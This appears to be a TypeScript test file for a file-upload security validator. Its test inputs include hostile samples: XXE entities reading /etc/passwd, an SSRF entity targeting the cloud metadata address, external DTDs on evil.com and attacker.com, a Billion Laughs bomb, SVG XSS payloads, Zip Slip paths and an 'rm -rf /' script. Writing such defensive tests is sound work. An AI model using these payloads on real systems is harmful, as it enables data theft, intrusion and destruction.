import { describe, it, expect } from 'vitest';
import {
  detectMagicBytes,
  inspectXmlSafety,
  sanitizeFilename,
  validateFileSecurity,
  inspectArchiveSafety,
  isExecutableBinary,
} from '../js/security/fileValidator';
import JSZip from 'jszip';

describe('File Security - Magic Bytes & Executable Detection', () => {
  it('identifies standard PDF magic bytes (%PDF-)', () => {
    const pdfHeader = new TextEncoder().encode(
      '%PDF-1.7\n%some binary content'
    );
    const result = detectMagicBytes(pdfHeader);
    expect(result.type).toBe('pdf');
    expect(result.isExecutable).toBe(false);
  });

  it('identifies standard PNG magic bytes', () => {
    const pngHeader = new Uint8Array([
      0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00,
    ]);
    const result = detectMagicBytes(pngHeader);
    expect(result.type).toBe('png');
    expect(result.isExecutable).toBe(false);
  });

  it('identifies standard JPEG magic bytes (FF D8 FF)', () => {
    const jpegHeader = new Uint8Array([
      0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46,
    ]);
    const result = detectMagicBytes(jpegHeader);
    expect(result.type).toBe('jpeg');
    expect(result.isExecutable).toBe(false);
  });

  it('identifies standard GIF magic bytes (GIF87a / GIF89a)', () => {
    const gifHeader = new TextEncoder().encode('GIF89a\x01\x00\x01\x00');
    const result = detectMagicBytes(gifHeader);
    expect(result.type).toBe('gif');
    expect(result.isExecutable).toBe(false);
  });

  it('identifies standard WebP magic bytes (RIFF....WEBP)', () => {
    const webpHeader = new Uint8Array([
      0x52,
      0x49,
      0x46,
      0x46, // RIFF
      0x20,
      0x00,
      0x00,
      0x00, // length
      0x57,
      0x45,
      0x42,
      0x50, // WEBP
    ]);
    const result = detectMagicBytes(webpHeader);
    expect(result.type).toBe('webp');
    expect(result.isExecutable).toBe(false);
  });

  it('identifies standard ZIP archive magic bytes (PK\\x03\\x04)', () => {
    const zipHeader = new Uint8Array([0x50, 0x4b, 0x03, 0x04, 0x14, 0x00]);
    const result = detectMagicBytes(zipHeader);
    expect(result.type).toBe('zip');
    expect(result.isExecutable).toBe(false);
  });

  it('immediately detects Windows PE executable (MZ header) disguised as PDF', () => {
    const peHeader = new Uint8Array([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00]); // MZ...
    const result = detectMagicBytes(peHeader);
    expect(result.isExecutable).toBe(true);
    expect(result.type).toBe('executable_pe');
    expect(isExecutableBinary(peHeader)).toBe(true);
  });

  it('immediately detects Linux ELF binary disguised as PDF or EPUB', () => {
    const elfHeader = new Uint8Array([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01]); // \x7FELF
    const result = detectMagicBytes(elfHeader);
    expect(result.isExecutable).toBe(true);
    expect(result.type).toBe('executable_elf');
    expect(isExecutableBinary(elfHeader)).toBe(true);
  });

  it('immediately detects Mach-O binaries (32-bit & 64-bit)', () => {
    const machO64 = new Uint8Array([0xcf, 0xfa, 0xed, 0xfe]);
    const result = detectMagicBytes(machO64);
    expect(result.isExecutable).toBe(true);
    expect(result.type).toBe('executable_macho');
  });

  it('immediately detects script executables (shebang #! or @echo)', () => {
    const shHeader = new TextEncoder().encode('#!/bin/bash\nrm -rf /');
    expect(isExecutableBinary(shHeader)).toBe(true);

    const batHeader = new TextEncoder().encode('@echo off\ncalc.exe');
    expect(isExecutableBinary(batHeader)).toBe(true);
  });
});

describe('File Security - XML External Entity (XXE) & Billion Laughs', () => {
  it('blocks XML External Entity with SYSTEM file retrieval', () => {
    const xxePayload = `<?xml version="1.0"?>
    <!DOCTYPE root [
      <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <root><data>&xxe;</data></root>`;
    const check = inspectXmlSafety(xxePayload);
    expect(check.safe).toBe(false);
    expect(check.reason).toMatch(/XXE.*SYSTEM/i);
  });

  it('blocks XML External Entity with SYSTEM URL / SSRF', () => {
    const xxeSsrf = `<?xml version="1.0"?>
    <!DOCTYPE foo [
      <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
    ]>
    <foo>&xxe;</foo>`;
    const check = inspectXmlSafety(xxeSsrf);
    expect(check.safe).toBe(false);
    expect(check.reason).toMatch(/XXE.*SYSTEM/i);
  });

  it('blocks XML External Entity with PUBLIC identifiers', () => {
    const xxePublic = `<?xml version="1.0"?>
    <!DOCTYPE foo [
      <!ENTITY xxe PUBLIC "bar" "http://evil.com/dtd">
    ]>
    <foo>&xxe;</foo>`;
    const check = inspectXmlSafety(xxePublic);
    expect(check.safe).toBe(false);
    expect(check.reason).toMatch(/XXE.*PUBLIC/i);
  });

  it('blocks Parameter Entity declarations', () => {
    const pePayload = `<?xml version="1.0"?>
    <!DOCTYPE foo [
      <!ENTITY % pe SYSTEM "http://attacker.com/pe.dtd">
      %pe;
    ]>
    <foo>test</foo>`;
    const check = inspectXmlSafety(pePayload);
    expect(check.safe).toBe(false);
    expect(check.reason).toMatch(/Parameter Entity/i);
  });

  it('blocks Billion Laughs / XML Entity Bomb attacks', () => {
    const billionLaughs = `<?xml version="1.0"?>
    <!DOCTYPE lolz [
      <!ENTITY lol "lol">
      <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
      <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
      <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    ]>
    <lolz>&lol3;</lolz>`;
    const check = inspectXmlSafety(billionLaughs);
    expect(check.safe).toBe(false);
    expect(check.reason).toMatch(/Entity Bomb|Billion Laughs/i);
  });

  it('accepts safe, well-formed XML without malicious DTD or external entities', () => {
    const safeXml = `<?xml version="1.0" encoding="UTF-8"?>
    <book id="123">
      <title>Secure Coding in TypeScript</title>
      <author>Alice</author>
      <summary>Comprehensive guide to secure applications.</summary>
    </book>`;
    const check = inspectXmlSafety(safeXml);
    expect(check.safe).toBe(true);
    expect(check.reason).toBeUndefined();
  });
});

describe('File Security - SVG XSS Defense', () => {
  it('blocks SVG containing <script> tags', () => {
    const evilSvg = `<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
      <script>alert(document.domain)</script>
      <circle cx="50" cy="50" r="40" fill="green"/>
    </svg>`;
    const check = inspectXmlSafety(evilSvg, { isSvg: true });
    expect(check.safe).toBe(false);
    expect(check.reason).toMatch(/<script>/i);
  });

  it('blocks SVG containing inline event handlers (onload, onerror, onclick)', () => {
    const evilSvg = `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
      <rect width="100" height="100"/>
    </svg>`;
    const check = inspectXmlSafety(evilSvg, { isSvg: true });
    expect(check.safe).toBe(false);
    expect(check.reason).toMatch(/event handler/i);
  });

  it('blocks SVG containing javascript: URIs in href or xlink:href', () => {
    const evilSvg = `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
      <a xlink:href="javascript:alert(1)">
        <circle cx="50" cy="50" r="40"/>
      </a>
    </svg>`;
    const check = inspectXmlSafety(evilSvg, { isSvg: true });
    expect(check.safe).toBe(false);
    expect(check.reason).toMatch(/javascript:/i);
  });

  it('blocks SVG containing malicious <foreignObject>', () => {
    const evilSvg = `<svg xmlns="http://www.w3.org/2000/svg">
      <foreignObject width="100" height="100">
        <body xmlns="http://www.w3.org/1999/xhtml">
          <img src="x" onerror="alert(1)"/>
        </body>
      </foreignObject>
    </svg>`;
    const check = inspectXmlSafety(evilSvg, { isSvg: true });
    expect(check.safe).toBe(false);
    expect(check.reason).toMatch(/foreignObject|event handler/i);
  });

  it('accepts clean, benign SVG graphics', () => {
    const cleanSvg = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
      <circle cx="50" cy="50" r="40" stroke="green" stroke-width="4" fill="yellow" />
      <path d="M 10 10 L 90 90" stroke="black" />
    </svg>`;
    const check = inspectXmlSafety(cleanSvg, { isSvg: true });
    expect(check.safe).toBe(true);
  });
});

describe('File Security - Filename Sanitization & Path Traversal', () => {
  it('strips directory traversal components (../, ..\\)', () => {
    expect(sanitizeFilename('../../etc/passwd.pdf')).toBe('passwd.pdf');
    expect(sanitizeFilename('..\\..\\windows\\system32\\calc.exe.pdf')).toBe(
      'calc.exe.pdf'
    );
    expect(sanitizeFilename('/var/www/uploads/document.pdf')).toBe(
      'document.pdf'
    );
  });

  it('strips null bytes and non-printable control characters', () => {
    expect(sanitizeFilename('my\x00file\x1f.pdf')).toBe('myfile.pdf');
  });

  it('strips dangerous HTML / XSS characters from filenames', () => {
    expect(sanitizeFilename('<script>alert(1)</script>.pdf')).toBe(
      'alert(1).pdf'
    );
    expect(sanitizeFilename('image" onerror="alert(1)".png')).toBe(
      'image onerror=alert(1).png'
    );
  });

  it('limits excessively long filenames to a safe length (max 255 chars) while preserving extension', () => {
    const longBase = 'a'.repeat(300);
    const sanitized = sanitizeFilename(`${longBase}.pdf`);
    expect(sanitized.length).toBeLessThanOrEqual(255);
    expect(sanitized.endsWith('.pdf')).toBe(true);
  });
});

describe('File Security - Archive Inspection (Zip Slip & Zip Bomb)', () => {
  it('detects and blocks Zip Slip directory traversal in archive entries', async () => {
    const zip = new JSZip();
    zip.file('../../evil.sh', 'echo pwned');
    zip.file('safe.txt', 'hello');
    const zipBuffer = await zip.generateAsync({ type: 'arraybuffer' });

    const check = await inspectArchiveSafety(zipBuffer);
    expect(check.safe).toBe(false);
    expect(check.reason).toMatch(/directory traversal|zip slip/i);
  });

  it('detects and blocks absolute paths in archive entries', async () => {
    const zip = new JSZip();
    zip.file('/etc/passwd', 'root:x:0:0:root:/root:/bin/bash');
    const zipBuffer = await zip.generateAsync({ type: 'arraybuffer' });

    const check = await inspectArchiveSafety(zipBuffer);
    expect(check.safe).toBe(false);
    expect(check.reason).toMatch(/absolute path|zip slip/i);
  });

  it('passes a safe archive with relative paths', async () => {
    const zip = new JSZip();
    zip.file('OEBPS/content.opf', '<package>EPUB Content</package>');
    zip.file('META-INF/container.xml', '<container>Container</container>');
    const zipBuffer = await zip.generateAsync({ type: 'arraybuffer' });

    const check = await inspectArchiveSafety(zipBuffer);
    expect(check.safe).toBe(true);
  });
});

describe('File Security - Full File Validator (validateFileSecurity)', () => {
  it('validates a legitimate PDF file', async () => {
    const pdfBytes = new TextEncoder().encode(
      '%PDF-1.4\n1 0 obj\n<< /Type /Catalog >>\nendobj\n%%EOF'
    );
    const file = new File([pdfBytes], 'report.pdf', {
      type: 'application/pdf',
    });

    const res = await validateFileSecurity(file, { expectedType: 'pdf' });
    expect(res.valid).toBe(true);
    expect(res.sanitizedFilename).toBe('report.pdf');
  });

  it('rejects an executable disguised as a PDF file', async () => {
    const exeBytes = new Uint8Array([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00]); // MZ
    const file = new File([exeBytes], 'invoice.pdf', {
      type: 'application/pdf',
    });

    const res = await validateFileSecurity(file, { expectedType: 'pdf' });
    expect(res.valid).toBe(false);
    expect(res.reason).toMatch(/executable/i);
  });

  it('rejects a file whose magic bytes do not match expected PDF type', async () => {
    const textBytes = new TextEncoder().encode(
      'Hello World this is plain text'
    );
    const file = new File([textBytes], 'fake.pdf', { type: 'application/pdf' });

    const res = await validateFileSecurity(file, { expectedType: 'pdf' });
    expect(res.valid).toBe(false);
    expect(res.reason).toMatch(/magic bytes|signature/i);
  });

  it('rejects an SVG file containing XXE payload', async () => {
    const xxeSvg = `<svg xmlns="http://www.w3.org/2000/svg">
      <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
      <text>&xxe;</text>
    </svg>`;
    const file = new File([xxeSvg], 'graphic.svg', { type: 'image/svg+xml' });

    const res = await validateFileSecurity(file, { expectedType: 'svg' });
    expect(res.valid).toBe(false);
    expect(res.reason).toMatch(/XXE/i);
  });

  it('rejects an EPUB archive containing Zip Slip', async () => {
    const zip = new JSZip();
    zip.file('../../../windows/win.ini', 'data');
    const buffer = await zip.generateAsync({ type: 'arraybuffer' });
    const file = new File([buffer], 'book.epub', {
      type: 'application/epub+zip',
    });

    const res = await validateFileSecurity(file, { expectedType: 'epub' });
    expect(res.valid).toBe(false);
    expect(res.reason).toMatch(/directory traversal|zip slip/i);
  });
});

describe('File Security - ISO Base Media images (HEIC / AVIF)', () => {
  function isoFile(brand: string): Uint8Array {
    const bytes = new Uint8Array(16);
    bytes.set([0x00, 0x00, 0x00, 0x18], 0); // box size
    bytes.set(new TextEncoder().encode('ftyp'), 4);
    bytes.set(new TextEncoder().encode(brand), 8);
    return bytes;
  }

  it('identifies HEIC by its ftyp brand rather than its extension', () => {
    for (const brand of ['heic', 'heix', 'mif1', 'msf1']) {
      expect(detectMagicBytes(isoFile(brand)).type).toBe('heic');
    }
  });

  it('identifies AVIF', () => {
    expect(detectMagicBytes(isoFile('avif')).type).toBe('avif');
  });

  it('leaves other ftyp brands unidentified rather than guessing', () => {
    expect(detectMagicBytes(isoFile('mp42')).type).toBe('unknown');
  });

  it('accepts a HEIC file where an image is expected', async () => {
    const file = new File(
      [isoFile('heic').buffer as ArrayBuffer],
      'photo.heic',
      {
        type: 'image/heic',
      }
    );
    const result = await validateFileSecurity(file, { expectedType: 'image' });
    expect(result.valid).toBe(true);
    expect(result.detectedType).toBe('heic');
  });
});
